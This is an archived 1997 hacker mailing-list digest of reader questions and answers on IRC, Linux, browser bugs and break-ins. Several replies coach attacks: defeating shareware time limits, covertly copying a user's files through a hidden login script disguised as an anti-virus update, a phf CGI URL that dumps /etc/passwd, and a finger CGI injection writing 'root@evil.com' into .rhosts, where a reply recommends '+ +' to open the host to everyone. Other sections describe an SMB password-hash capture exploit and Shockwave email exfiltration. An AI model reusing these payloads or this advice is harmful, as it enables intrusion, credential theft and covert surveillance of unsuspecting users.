@@ -1,0 +1,689 @@
+Happy Hacker Digest March 16-17, 1997 
+====================================================================== 
+      This is a moderated list for discussions of *legal* hacking. 
+           Moderators: Carolyn Meinel and Matt Hinze
+                 
+            OR to the Hackers forum: http://www.infowar.com 
+Digest archives are held under the "New" button at the Infowar site
+
+               Please don't send us anything you wouldn't 
+              email to your friendly neighborhood narc, OK?
+
+        To subscribe or 
+unsubscribe, use the subscribe boxes on the menu bars, please.. 
+If you decide you just want to use the forum and not get these 
+mailings, we promise our feelings won't get hurt if you unsubscribe 
+from this list. 
+                       H a p p y  h a c k i n g ! 
+================================================================= 
+URL 'O the Day: 
+=================================================================
+
+[TABLE OF CONTENTS]
+
+o Circumventing Shareware Nags and Limitations 
+o IRC 
+o Should the sysadmin know? 
+o Learning Linux 
+o Port 25 
+o Internet Explorer Exploits 
+o New Netscape and Shockwave Bug 
+o Windows 95 and Windows NT Hacking 
+o *nix Miscellany 
+o Correction
+
+================================================== 
+   Circumventing Shareware Nags and Limitations 
+==================================================
+
+From: Trey Schultz <stwaldo@teleport.com>
+
+Easy Out: 
+Set your system clock(s) to Jan. 4, 2020.  Install shareware. 
+Reset clock(s) to current date.  Viola, you have 20+ years to 
+evaluate, you cheater, you! :)
+
+Hard Out: 
+Open regedit. Take a look around, find where app info is stored 
+(there are several places, keep track of them all).  Install 
+shareware.  Look for this new prog's reg entries. Look for install 
+dates.  Change 'em.  Viola, you know how to use the registry, you 
+cheater, you! :)
+
+Elite Out: 
+Hack the fat, 16 and 32 bit.  Write a utility to "freeze" the 
+current installation of WinHoze.  Use it. Install shareware. 
+If it gives you any flak down the road, "unfreeze" WinBlowz, 
+reinstall shareware.
+
+All three have been tried and succeeded for me.
+
+____________________________________________________________________ 
+|    Saint Waldo I.P./E.    |  "Some folk'll never eat a skunk     | 
+|   stwaldo@teleport.COM    |   And then again some folk'll...     | 
+| www.teleport.com/~stwaldo |   Like Cletus t' Slack-jawed Yokel!" | 
+|___________________________|______________________________________| 
+ 
+
+================================================== 
+                       IRC 
+==================================================
+
+From: Curtis Horton <curtis.horton@snet.net>
+
+> When I am on mIRC once in a while I notice that I get this on my 
+> server status window: *** Identd request from 207.155.184.71 *** 
+> Identd replied: 1145, 25 : USERID : UNIX : fifo ..is it that the 
+> system wants 2 kno whu I am?.. what duz 1145, 25 mean?.. thanks
+
+This is kinda how things work..when you log onto an IRC server (a good 
+one)they use Identd to check who you are. This is done, so if someone 
+has a Netcom account, they can't fake their user name and get auto-ops 
+on channels where bots are setup to auto up Netcom people.. I think 
+how Identd works is that the questioning host sends it first to you, 
+then to your ISP. Whoever made mIRC put in this little Identd program 
+that scans for and Identd requests to you, and sends back whatever you 
+have put in. This more or less lets you fake the first part of your 
+user name. You can do this in fake mail to make it look like the mail 
+came from you.are.lame@isp.net, but there is something added to the 
+end of people's domain when they dial up that lets DNS servers get the 
+IP. This isn't totally anonymusly, they ppl can just trace you through 
+your IP. 
+ 
+
+-------------------------------------------------
+
+From: "Crazy J" <crazyj@earthlink.net>
+
+>Hey list. I was sitting in IRC when some idiot came into the 
+>channel swearing and so-on so I kicked him out.  When i tried to 
+>get online later that night i couldn't, after calling my ISP i 
+>discovered that this guy has hacked into some server under MY 
+>username.  How did he do this and how can i prevent him from 
+>getting ANY info from me in IRC.  You guys gotta be careful, my 
+>ISP killed my account and i'm now trying to explain myself to 
+>them.  I was one of the two people who got hacked and i wanna 
+>know how to stop em!
+
+Hey All, First off as the others said if your not using identd you our 
+adevertising your user name on IRC. Second for most of the bigger 
+service providers and most of the smaller ones as well. If you take 
+the last two parts of the site when you do a whois on someone and 
+stick it in your webrowser preceded by www you will go to there 
+service providers home page. Which no doubt will give you dial up 
+numbers and everything else under the sun. Example you do a whois on 
+whoever and you get whoever@ppp15.mulbery.com type 
+http://www.mulbery.com/ in your web browser and you got the 
+information on their service provider, numbers for their pops, e.t.c. 
+Another note on this is that many of the ISP's set their customers 
+home directorys to /~whoever/ so If you want more info you can always 
+type in that url and see if a home page comes up. The next point is 
+even if you where using Identd to hide your real user name on IRC if 
+you have ever advertised your e-mail address on channel or since you 
+stated you where an op, if your e-mail address is in a channel faq, 
+your giving your user name to them. For most ISPs use your user name 
+in the e-mail address ie whoever@mulbery.com. With the e-mail address 
+you got the user name from the first half and can get pertitnent info 
+on the ISP from the second with the browser trick.Thus they got dial 
+up numbers, and your user name, so 50% of the work is done for them, 
+all they need to do is brute force your password with any of the 
+available programs on the web. One last point before I go, is that if 
+a person has an account on the same ISP as you do they can call the 
+same pop as you do and through the use of identd and become you site 
+and all as far as IRC is concerned, you can learn more on that at my 
+site http://www.win.net/~cjc/fear/fear.html.
+
+Later, 
+ Crazy J
+
+==================================================== 
+             Should the sysadmin know? 
+====================================================
+
+From: "Aileron" <aileron@aileron.com>
+
+Hi all, 
+  While port-surfing on a local ISP, I discovered that they were 
+using an older version of Sendmail which has a potentially serious 
+bug (The 7/8bit MIME thing in Sendmail 8.8.4). What's the best thing 
+to do now? Kindly inform them that "Hey, I was snooping on your 
+system and I could've broken into it..." or just leave it be? 
+Thanks!
+
+ /-\ileron 
+-=-=-=-=- 
+ColeSlaw Creative Internet 
+aileron@akula.com 
+www.akula.com/~aileron/csci 
+ 
+
+==================================== 
+          Learning Linux 
+====================================
+
+From: Nils Janson <Nils.Janson@munich.netsurf.de>
+
+Although this has nothing to do with hacking (well, it does, in a way) 
+I'm having trouble setting up my isdn card (Teles 16.3) with 
+isdn4linux.  And PPP, for that matter.  For some reason, everytime 
+that I try to insmod the bloody thing, or any other networking module, 
+it says something to the effect of: Characters do not match those in 
+(some file involving the kernal, like /usr/src/linux-2.0-18/<foo>). 
+This means that I can't load Mr. ISDN or PPP module and I need to use 
+my Win 95 box on the net.  Thanks, thanks, and more thanks.
+
+-- 
+Nils Janson 
+mailto:Nils.Janson@mail.munich.netsurf.de 
+(Cows rule forever) 
+ 
+
+=============================== 
+        Hacking Port 25 
+===============================
+
+From: Redington <nemesis@minot.com>
+
+Whenever I try to send fake mail by port 25 I get as far as typing my 
+message and I can't get it to stop and send it.  It says to end with a 
+"." on a line by itself.  Whenever I try to do this it doesn't work. 
+BTW the Unix server runs AIX 4.2 if that matters. Anticipated thanks.
+
+neMEsis
+
+[moderator: It needs a carriage return, then the period '.', then 
+another carriage return.]
+
+=============================================== 
+         Internet Explorer Exploits 
+===============================================
+
+From: Aaron Spangler <pokee@MAXWELL.EE.WASHINGTON.EDU>
+
+Included below is IE Bug#4 I would like to post. 
+It can be found at:
+
+http://www.ee.washington.edu/computing/iebug/
+
+Internet Explorer Exploit #4
+
+The exploit works for both Netscape Navigator 3.01 and Microsoft 
+Internet Explorer 3.01 with Security Patches. (earlier versions should 
+work as well, but have not yet been tested). 
+Look below to see how it works. 
+ 
+
+****How it Works******
+
+Web page that points to a Rogue SMB Server
+
+This web pages contains an embedded image (actually two).  The 
+embedded images do not reside in this same directory as this web page. 
+In fact, they reside on a SMB Lanman server (as opposed to an HTTP 
+server). (View the source for this html to get a better idea what I am 
+talking about). I borrowed this idea from the 
+<A href=http://dec.dorm.umd.edu/>Last MS Internet Explorer Security 
+Exploit.</A>
+
+The modified SMB Server
+
+In order for the client to download the images, the client needs to 
+'logon' to the Lanman server.  Windows NT seems to do this without 
+even asking the user for confirmation.  Windows NT simply forwards the 
+username and encrypted version of the user's password to the Lanman 
+server. The Lanman server code has been modified slightly to record 
+Usernames and "Hashed Passwords" of the victims.  Also the code has 
+been modified to supply the client with a <b>fixed</b> "Challenge seed 
+value" for password encryption. (Thus making it even easier to decode 
+the client passwords in the future.) See <a 
+href=nt_pw_dict_attack.txt>NT Password Dictionary Attack</a> for where 
+I got the Lanman server idea.
+
+What's the big deal?
+
+First of all, no remote web site should be able to record your 
+username. If they do, then can compile junk email lists and sell your 
+name. Secondly, if they have information on what your password might 
+be, and they know what site you came from, they can gain access to 
+your computer or local account.  (Thus compromising your security with 
+you never knowing about it.) It is fairly easy to unencrypt a MS 
+password if the challenge has set to zero via dictionary attacks. 
+Sequential search brute force attacks work as well if you can guess 
+what types of characters are most common in the password.  Yes, it is 
+time consuming, but if your account gets hacked, is it really worth 
+it?
+
+It is interesting to note that in theory someone could setup a Lanman 
+server that make a simultaneous connection back to the client as a 
+connection comes in.  By simply relaying the same challenge and 
+password back to the client, the remote server could gain network 
+access to the vulnerable client.
+
+<h4> Did you really get my username & hashed password? </h4> 
+Take a look at the <a href=passout.txt>log so far.</a> Remember these 
+passwords are easier to unencrypt because the challenge response is 
+set to 
+all zeros!
+
+<hr> 
+<address> 
+IE BUG #4, by <a href=/staff/spangler.html>Aaron Spangler</a> 
+</address>
+
+-- 
+Aaron Spangler                 EE Unix System Administrator 
+Electrical Engineering FT-10        pokee@ee.washington.edu 
+University of Washington            Phone    (206) 543-8984 
+Box 352500                             or    (206) 543-2523 
+Seattle, WA 98195-2500              Fax      (206) 543-3842
+
+[moderator: This message was originally posted to the Bugtraq mailing 
+list, moderated by Aleph One. To subscibe to Bugtraq, Write to 
+LISTSERV@NETSPACE.ORG and, in the  text of your message (not the 
+subject line), write: SUBSCRIBE BUGTRAQ ]
+
+================================================ 
+ New Netscape / Shockwave Bug 
+================================================
+
+From: ntsecurity@THEPENTAGON.COM
+
+A new security hole was found in Netscape browsers, and possibly 
+affects IE users as well. Shockwave lets a person read a user's email, 
+and forward it out to places on the net at will - and according to one 
+person, it looks like Java may allow this same thing to happen as 
+well.
+
+I've mirrored the original page here due to traffic loads over there: 
+http://www.ntshop.net/security/shockwave.htm 
+and the original post is here: http://www.webcomics.com/shockwave
+
+MJE
+
+(To subscribe to the NT Security list, email Majordomo@iss.net with 
+the following command in the body of your email message: 
+    subscribe ntsecurity <your email address>)
+
+------------------------------------------------------------------
+
+From: Aleph One <aleph1@DFW.NET>
+
+http://www.webcomics.com/shockwave/ 
+ 
+
+                           SHOCKWAVE SECURITY ALERT 
+  
+ 
+
+   AKA :: How to use Shockwave to read people's Netscape email!
+
+   10-Mar-97 --- reported by: David de Vitry
+
+   What is this about? 
+ 
+
+       This is about a security hole in Shockwave that allows 
+malicious 
+       webpage developers to create a Shockwave movie that will read 
+       through a user's emails, and potentially upload them to a 
+server. 
+       All without the user knowing about it. In addition, there is a 
+       risk to internal Web servers behind corporate firewalls, 
+       regardless of the browser you use (Netscape or Internet 
+Explorer), 
+       as long as you have the current release of Shockwave. 
+ 
+
+   Who could be affected? 
+ 
+
+       Users of Netscape 3.0 (and 2.0?) on Win 95 / NT/ Mac with 
+       Shockwave installed.  In addition, the user must not have 
+upgraded 
+       to "Communicator", (this just changes the directory structure) 
+and 
+       must use the Netscape browser to read their email. There may be 
+       other browsers / platfroms affected by similar insecurities 
+with 
+       Shockwave 
+  
+ 
+
+   How is this done? 
+ 
+
+       A developer can use Shockwave to access the user's Netscape 
+email 
+       folders. This is done assuming the name and path to the mailbox 
+on 
+       the users hard drive. For example names such as: Inbox, Outbox, 
+       Sent and Trash are all default names for mail folders. The 
+default 
+       path to the "Inbox" on Win 95/NT would be: "C:/Program 
+       Files/Netscape/Navigator/Mail/Inbox". Then the developer can 
+use 
+       the Shockwave command "GETNETTEXT" to call Navigator to query 
+the 
+       email folder for an email message. The results of this call can 
+       then be feed into a variable, and later processed and sent to a 
+       server. To access a message, for example, the first message in 
+a 
+       users Inbox, would be called using the following location:
+
+       For Windows: mailbox:C:/Program 
+       Files/Netscape/Navigator/Mail/Inbox?number=0
+
+       For MacOS (thanks Jeremy Traub)
+
+mailbox:/Macintosh%20HD/System%20Folder/Preferences/Netscape%20%C 
+       4/Mail/Inbox?number=0
+
+       Note: if these links all give you an error (such as folder no 
+       longer exists), then you might not have anything to worry 
+about. 
+       However, if you see an email message in a pop up window, and 
+you 
+       have Shockwave installed, then you are vulnerable to this 
+security 
+       hole. 
+ 
+
+   Show Me an example! Here it is, a Shockwave movie that will read 
+your 
+   email. This will not work for everyone, it is currently only setup 
+to 
+   work with Win95 / NT, but it could be extended to identify the 
+browser 
+   (Jeremy Traub).
+
+   Interesting, but what is the security hole? 
+ 
+
+       It doesn't stop at just the first messages of your inbox. 
+       A shockwave program could increment through a users entire 
+inbox, 
+       outbox, sent, and trash email folder. This information could 
+then 
+       be sent back to a server (using a the GET method with a simple 
+cgi 
+       program. i.e.
+
+http://www...com/upload.cgi?data=This_could_be_your_email_content_ 
+       here), all with out the user ever noticing. Here are just a few 
+       types of information that a malicious developer could obtain 
+using 
+       this hole: 
+          + Your name and email 
+          + Your friends names and emails 
+          + User id's and passwords sent to you in email, and where 
+and 
+            how to use them. 
+          + Personal email messages that you sent or received using 
+            Netscape 
+  
+ 
+
+       The "GETNETTEXT" command also has other problems in that it can 
+       access other http servers, including ones that are not on the 
+       internet, ie, ones that are behind a corporate firewall. That 
+is 
+       if the movie is run from behind the firewall. This may be even 
+a 
+       bigger problem then the email one, however it affects only 
+       corporate users. 
+ 
+
+   Help: What can I do to protect myself? 
+ 
+
+       There are a number of things that you could do to protect 
+yourself 
+       from malicious shockwave movies: 
+          + Change the path to your mail folders 
+          + Don't use Netscape to read or send email 
+          + DeInstall Shockwave 
+          + Don't go to potentially hostile sites. 
+  
+ 
+
+   What are people saying? -- please inform me of any other articles. 
+     * Wired article 
+     * Macromedia and Netscape have given me no official statements. 
+       However, they are both in communication with me regarding this 
+       issue. Macromedia did say that their newest product "Shockwave 
+6," 
+       currently in pre-release, does fix this problem. 
+     * Microsoft did not want to talk with me about the issue, even 
+       though there are risks to their users. They just blew me off 
+       saying "There are obviously plenty of security bugs to go 
+around." 
+       Followed by, "Great, we're checking it out now." 
+ 
+
+==================================================== 
+       Windows 95 and Windows NT Hacking 
+====================================================
+
+From: david@cathouse.com
+
+>I am a Network tech and recently the VP of IS comes to me and 
+>says that he wants to know what is on a certain workstation's 
+>hard disk. 
+> 
+>Here's the Setup: 
+>The workstation is 45 miles from my location.  It is a DOS/Windows 
+>Netware client running IPX only.  He logs onto a Netware server at 
+>his location which is connected to my main ring.  So I have access to 
+>his server even his machine via IPX. 
+> 
+>How can I get a directory listing?  Is there an NLM out there that I 
+>can run on his server that would allow me to view his hard disk 
+>contents?
+
+If you have access to syscon from your location, it's REAL easy. 
+Edit the user's login script and add whatever dos commands you want, 
+just be 
+sure to echo them to nowhere :-)
+
+dir /s >f:\joefiles.txt 
+(or whatever drive that's mapped to the server where you can get it 
+later)
+
+Thing I usually do in that situation is put a screen up for the user 
+like:
+
+Please wait, updating anti-virus files...
+
+That way they don't think anything of the wait.... 
+Then you can go back later and copy the files you want.  Works best if 
+you make a special subdirectory for "loot".
+
+You need to do a call from the users login script to a batch file in 
+order to do the commands.... 
+ 
+
+----------------------------------------------------------------------------
+
+From: Jay Clements <jayc@mail.org>
+
+>I am a Network tech and recently the VP of IS comes to me and 
+>says that he wants to know what is on a certain workstation's 
+>hard disk. 
+> 
+>Here's the Setup: 
+>The workstation is 45 miles from my location.  It is a DOS/Windows 
+>Netware client running IPX only.  He logs onto a Netware server at 
+>his location which is connected to my main ring.  So I have access to 
+>his server even his machine via IPX. 
+> 
+>How can I get a directory listing?  Is there an NLM out there that I 
+>can run on his server that would allow me to view his hard disk 
+>contents?
+
+I've never heard of an NLM that would do this. Netware is server 
+centric...not peer to peer. But there is a way to do this Managewise. 
+This application will allow you to 'catalog' a workstations hard disk. 
+Very handy utility. Managewise is the only thing I've heard of that 
+will do what you are looking for.
+
+Jay 
+--Jason Clements 
+--Certified Novell Administrator 
+--email: jayC@compusmart.ab.ca 
+--home page http://www.ualberta.ca/~mrau/bauhaus/bauhaus.htm
+
+============================================== 
+              *nix Miscellany 
+==============================================
+
+From: yeo@poi.net
+
+ I wanted to ask you a question on passwd files. why is it that 
+sometimes passwd files have the users login and passwords encryped on 
+it and the others on it just show the shadowed 'x' mark on it and 
+sometimes the root password is on but not some of the other logins and 
+they just have the shadowed marked 'x' ? I also wanted to know how 
+people get caught password sniffing, please explain. 
+ A friend of mine told me that people couldn't get root access 
+on a system by telnet (which would be dumb) or dialup, only if you 
+were physically at the sysadmin's computer. Is this true ?
+
+Thanks, 
+Nikola Tesla
+
+[moderator: Your friend was mistaken. You can gain root access 
+remotely as well.]
+
+---------------------------------------------------------------------- 
+From: [anonymous]
+
+Make me anonymous, please.
+
+Anon skrev: 
+>  I was actually kind of surprised when I got OD phreak's long command 
+> (http://,,,.,,,.,,,/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd) from a 
+> previous guide to work. If you haven't tried it yet, try it out now. 
+> I got the password file, but it was shadowed. Can I edit this to 
+> get the shadowed file or any other valuable files?
+
+Perhaps if phf has the right privilegies.
+
+> One last thing: If you telnet to prez.cn.camriv.bc.ca, you can login as 
+> lynx and get a free (legal) lynx browser account (it's just like logging 
+> on as a guest). Are this means that any site you go to doesn't know who 
+> you really are. What kind of things would this account be good for?
+
+It wasn't a very safe installation, one can easily edit the 
+configuration file, and then, you can probably use an editor or other 
+program which allows you to shell out. You can also peek around the 
+entire system. Or you could just use it for web browsing if you 
+haven't got access to a web browser.
+
+> I was wondering about the following. Is it possible for someone to remotely 
+> create a .rhosts file in a users directory in a remote server. The command 
+> appended to /cgi-bin/ would look something like the following... 
+> 
+> http://targethost.com/cgi-bin/finger?user; \echo root@evil.com > 
+> /usr/user/.rhosts
+
+An even better solution, which would not give you away as easily, 
+would be to echo + + (wildcards in rhosts), so everyone could gain 
+remote access.
+
+> Is this possible? If not are there any other ways remote users could 
+> exploit a vulnerable cgi server to allow remote access?
+
+There are many ways.
+
+**** 
+> 
+> I would like to know, what other methods besides finding the passwd file 
+> and or shadow  file there are in getting into an ISP.  For knowledge's sake 
+> of course.  If you finally do get the passwd file and it has *'s then you 
+> got to find the shadow, if you do and it is ROOT readable only, then what? 
+> Does that mean your out of luck?  Flame on....
+
+You could use vulnerabilities in finger, sendmail, cgi-scripts, and 
+any other service you have access to. 
+You could try to compile an unshadow program on the computer, if you 
+have shell access or can upload and execute commands.
+
+> From: Engineering Practice Pty Ltd <cdep@jimi.vianet.net.au> 
+> 
+> I was just wondering can you download stuff from your shell account to 
+> your home  pc(i.e. mail )?  I looked at the help files but couldn't find 
+> anything that would help 
+>  thanks 
+> 
+> Moderator: Use a file transfer protocol (FTP) program. There are many really 
+> good ones free for the download on the Web, and one is included in the Win 
+> 95 operating system. On some systems kermit downloads will work, too.
+
+If you telnet into the server, yes. You could sz (send ZModem), or sx 
+(Go figure), if you are connected through modem, or are using a telnet 
+client which can handle ZModem/XModem.
+
+> Sender: wolak@wolak.com 
+> 
+> There is a clever way to find someone's IP address. It uses a Java 
+> (great language) applet. The applet is allowed to look at only a few 
+> things about a host machine, and one of them is the host's IP. Also, 
+> applets are allowed to open up sockets to the server they came from. 
+> So, it's possible to write one that reads the host_IP and sends it back 
+> to a program on the server that records it. The same could be done with 
+> an application on his computed that does the same thing.
+
+Why not just look into your httpd logs? 
+ 
+
+------------------------------------------------------------------------
+
+From: [anonymous]
+
+I have a question about finger. you said in Vol. 1 number 3 that the 
+finger port is 79 but i keep getting a "host not responding" error on 
+many internet hosts, why ? Also I tried to finger a person on another 
+host like something@something.com and it told me "tcp/finger unknown 
+service when I'm still able to finger another person on my server, uh 
+why ? thanks
+
+|/^*******^\|
+
+please keep me anonymous/
+
+[Carolyn: many computers have disabled the finger port.] 
+ 
+
+====================================== 
+           Correction 
+======================================
+
+From: k1neTiK <samk5@idt.net>
+
+In that digest, you posted a message which supposedly was from me 
+about REG files.  Now I don't know if it was faked, or it was just a 
+mistake, but since it was a rather sophisticated post I think the real 
+autor should get credit, so whoever really wrote that piece, please 
+step forward!
+
+>From: k1neTiK <samk5@IDT.NET> 
+> 
+>Below is cut/paste of a .REG file that will turn off a large majority (at 
+>>least the important ones) of the policies can be invoked on a workstation 
+>running Windows95.  I wanted to send this out so all those people who are at 
+>work, and have had their administrator invoke policies on them they don't 
+>want. It took me a while to find all this stuff in the registry, but here it 
+>is(but first a few notes) 
+---Cut--- 
+this is how the message started. 
+ 
+
+             /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\ 
+            |////////////////////////////////////////////////////////| 
+            |////////////////////k1neTiK/////////////////////////////| 
+            |//// http://www.geocities.com/TimesSquare/Arcade/4594///| 
+            |//E-mail: samk5@mail.idt.net ///////////////////////////| 
+            |//IRC: usually on irc.stealth.net from around 5:30p.m.//| 
+            |///(under the handle k1neTiK,duh!)//////////////////////| 
+            |////////////////////Manhattan///////////////////////////| 
+             \/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
